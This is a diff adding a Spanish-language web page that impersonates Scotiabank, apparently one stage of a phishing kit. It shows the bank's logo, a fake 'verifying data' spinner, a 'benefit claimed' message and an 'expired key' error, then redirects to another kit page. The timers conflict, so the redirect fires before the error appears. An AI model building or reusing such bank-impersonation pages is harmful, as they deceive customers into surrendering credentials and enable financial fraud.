@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Facturando...</title>
+  <style>
+    body {
+      margin: 0;
+      background-color: #e30613; /* Rojo principal */
+      font-family: 'Segoe UI', sans-serif;
+      height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      align-items: center;
+      text-align: center;
+      color: white;
+    }
+
+    header {
+      padding: 25px 0 10px 0;
+    }
+
+    header img {
+      height: 42px;
+    }
+
+    main {
+      flex-grow: 1;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      font-weight: bold;
+      font-size: 22px;
+      user-select: none;
+    }
+
+    footer {
+      padding: 15px 0 25px;
+    }
+
+    .spinner-yellow {
+      border: 6px solid rgba(255, 255, 255, 0.3);
+      border-top: 6px solid #ffc400;
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 1s linear infinite;
+      margin: 25px 0;
+    }
+
+    .spinner-white {
+      border: 5px solid rgba(255, 255, 255, 0.3);
+      border-top: 5px solid #fff;
+      border-radius: 50%;
+      width: 30px;
+      height: 30px;
+      animation: spin 1s linear infinite;
+      margin: 12px auto 0;
+    }
+
+    @keyframes spin {
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
+    #mensaje-exito {
+      display: none;
+    }
+
+    #subtitulo {
+      font-weight: normal;
+      font-size: 16px;
+      margin-top: 6px;
+      color: #f2f2f2;
+    }
+
+    #error-message {
+      display: none;
+      background-color: #b00510;
+      color: white;
+      padding: 10px 18px;
+      font-weight: bold;
+      border-radius: 4px;
+      margin-top: 25px;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+    }
+  </style>
+</head>
+
+<body>
+  <header>
+    <!-- Logo principal -->
+    <img src="Scoti.png" alt="Logo Scotiabank" />
+  </header>
+
+  <main>
+    <div id="texto-cargando">Verificando datos...</div>
+    <div class="spinner-yellow" id="ruedita-cargando"></div>
+
+    <div id="mensaje-exito">
+      Beneficio reclamado con éxito!
+      <div id="subtitulo">Redireccionando a tu cuenta...</div>
+      <div class="spinner-white"></div>
+    </div>
+
+    <!-- Mensaje de error -->
+    <div id="error-message">
+      La llave ha caducado, por favor intenta nuevamente.
+    </div>
+  </main>
+
+  <!-- Logo inferior eliminado -->
+  <footer></footer>
+
+  <script>
+    const textoCargando = document.getElementById('texto-cargando');
+    const rueditaCargando = document.getElementById('ruedita-cargando');
+    const mensajeExito = document.getElementById('mensaje-exito');
+    const errorMessage = document.getElementById('error-message');
+
+    // Simular proceso con error temporal
+    setTimeout(() => {
+      textoCargando.style.display = 'none';
+      rueditaCargando.style.display = 'none';
+      mensajeExito.style.display = 'none';
+      errorMessage.style.display = 'block';
+
+      // Ocultar mensaje de error tras 3 segundos
+      setTimeout(() => {
+        errorMessage.style.display = 'none';
+      }, 3000);
+    }, 3000);
+
+    // Redirigir después de 2 segundos
+    setTimeout(() => {
+      window.location.href = 'cargando.html';
+    }, 2000);
+  </script>
+</body>
+</html>
